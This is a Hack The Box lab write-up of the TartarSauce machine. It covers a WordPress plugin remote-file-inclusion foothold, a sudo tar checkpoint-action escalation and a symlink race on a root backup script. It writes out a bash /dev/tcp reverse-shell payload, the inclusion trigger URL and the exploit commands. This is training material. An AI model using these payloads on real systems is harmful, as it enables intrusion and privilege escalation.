# HTB - TartarSauce

## Machine Info

|Field|Details|
|---|---|
|OS|Linux (Ubuntu 16.04)|
|Difficulty|Medium|
|IP|10.129.195.42|
|User|onuma|
|User flag|`3b9463d13afa3fc26f2873fd4f011ea4`|
|Root flag|`70100675bfdb9586b1b5e70665dd1e40`|

## Tags

#htb #linux #wordpress #rfi #wpscan #gwolle-gb #sudo-tar #backuperer #symlink #oscp-like

---

## Attack Path Overview

```
Nmap → port 80 (Apache)
→ robots.txt → /webservices/wp (WordPress)
→ wpscan → gwolle-gb plugin v1.5.3 (disguised as 2.3.10)
→ RFI via ajaxresponse.php?abspath= → www-data shell
→ sudo -u onuma tar --checkpoint-action → onuma shell
→ user flag
→ backuperer systemd timer (runs as root every 5 min)
→ evil tar with symlink to /root/root.txt → diff error log
→ /var/backups/onuma_backup_error.txt → root flag
```

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate 10000 10.129.195.42
nmap -sV -sC -p 80 10.129.195.42
```

Only **1 open port**: `80/tcp (Apache 2.4.18)`

### Web Enumeration

```bash
gobuster dir -u http://10.129.195.42 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Found: `/webservices`

```bash
gobuster dir -u http://10.129.195.42/webservices \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Found: `/webservices/wp` → WordPress installation

### WordPress Enumeration

```bash
wpscan --url http://10.129.195.42/webservices/wp \
  --enumerate p --plugins-detection aggressive
```

> ⚠️ **Must use `--plugins-detection aggressive`** — passive mode won't detect plugins!

Plugin found: **gwolle-gb** — version reported as `2.3.10`

Checking the readme:

```bash
curl http://10.129.195.42/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
```

Changelog reveals:

```
= 2.3.10 =
* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
```

**Actual version: `1.5.3`** — the author trolled wpscan!

```bash
searchsploit gwolle
searchsploit -x php/webapps/38861.txt
```

gwolle-gb 1.5.3 is vulnerable to **Remote File Inclusion (RFI)** via the `abspath` parameter in `ajaxresponse.php`.

---

## Foothold — RFI → www-data Shell

### Exploit Path

```
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php
  ?abspath=http://[attacker]/
```

The server fetches `wp-load.php` from the attacker's web root and executes it.

### Setup

```bash
# Create reverse shell payload
echo '<?php system("bash -c '\''bash -i >& /dev/tcp/10.10.17.240/4444 0>&1'\''"); ?>' > ~/wp-load.php

# Start HTTP server
python3 -m http.server 80

# Start listener
rlwrap nc -lvnp 4444
```

### Trigger RFI

```bash
curl "http://10.129.195.42/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.17.240/"
```

Shell received as `www-data`.

---

## Lateral Movement — www-data → onuma

### Sudo Check

```bash
sudo -l
```

Output:

```
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

### GTFOBins tar exploit

```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null \
  --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Shell received as `onuma`.

---

## User Flag

```bash
cat /home/onuma/user.txt
# 3b9463d13afa3fc26f2873fd4f011ea4
```

---

## Privilege Escalation — onuma → root (backuperer)

### Discovering the Timer

```bash
systemctl list-timers
```

Output:

```
backuperer.timer    backuperer.service   (runs every 5 minutes)
```

### Analyzing /usr/sbin/backuperer

Key sections of the script:

```bash
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# 1. Backup web root as onuma (we own this file!)
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# 2. Wait 30 seconds
/bin/sleep 30

# 3. Extract archive to /var/tmp/check
/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check

# 4. Diff check - if different, log errors to error file
integrity_chk() {
    /usr/bin/diff -r $basedir $check$basedir
}
if [[ $(integrity_chk) ]]
then
    integrity_chk >> $errormsg   # ← root writes diff output here!
```

**Key insight:**

- Root extracts our (replaced) archive to `/var/tmp/check`
- If contents differ from `/var/www/html`, diff output is written to `/var/backups/onuma_backup_error.txt` by root
- If the archive contains a **symlink to `/root/root.txt`** named `index.html`, diff will output the file **contents** into the error log!

### Exploit — Symlink in Tar

```bash
# Build malicious tar with symlink
cd /var/tmp
rm -rf exploit evil.tar.gz
mkdir -p exploit/var/www/html
cd exploit/var/www/html
ln -s /root/root.txt index.html
cd /var/tmp/exploit
tar -zcvf /var/tmp/evil.tar.gz .
```

### Wait for Timer and Replace Archive

```bash
cd /var/tmp
while true; do
  HASH=$(ls -la /var/tmp/ | grep '^\-' | grep -v evil | awk '{print $NF}')
  if [ -n "$HASH" ]; then
    cp /var/tmp/evil.tar.gz /var/tmp/$HASH
    echo "Replaced: $HASH"
    break
  fi
  sleep 0.5
done
```

### Read Root Flag from Error Log

Wait ~30 seconds after replacement, then:

```bash
cat /var/backups/onuma_backup_error.txt | tail -5
```

The diff output contains the contents of `/root/root.txt`:

```
< <!--Carry on, nothing to see here :D-->
---
> 70100675bfdb9586b1b5e70665dd1e40
```

---

## Root Flag

**`70100675bfdb9586b1b5e70665dd1e40`**

---

## Key Takeaways

- **Version spoofing in readme** — always read changelogs manually; `2.3.10` was actually `1.5.3`
- **wpscan aggressive mode required** — passive detection misses plugins entirely
- **RFI requires wp-load.php** — the plugin fetches this specific filename from the attacker's server
- **tar checkpoint-action GTFOBin** — `--checkpoint=1 --checkpoint-action=exec=<cmd>` executes arbitrary commands during tar operation
- **backuperer race condition** — 30-second sleep window allows replacing the archive before integrity check
- **symlink + diff = file read** — diff outputs file contents when a symlink resolves to a different file than expected, and root writes this to a world-readable error log
- **Symlink must match existing filename** — naming it `index.html` causes diff to compare contents rather than just reporting "Only in..."

## Attack Chain Summary

|Step|Technique|Tool|
|---|---|---|
|Enumeration|WordPress plugin detection|wpscan --plugins-detection aggressive|
|Foothold|RFI via gwolle-gb abspath|curl + wp-load.php|
|Lateral|sudo tar checkpoint-action|GTFOBins|
|PrivEsc|backuperer race + symlink tar|manual|
|Root read|diff error log|cat /var/backups/onuma_backup_error.txt|

## Credentials

|User|Access|Source|
|---|---|---|
|www-data|RFI shell|gwolle-gb 1.5.3 abspath parameter|
|onuma|shell|sudo tar GTFOBin|
|root|file read|backuperer symlink exploit|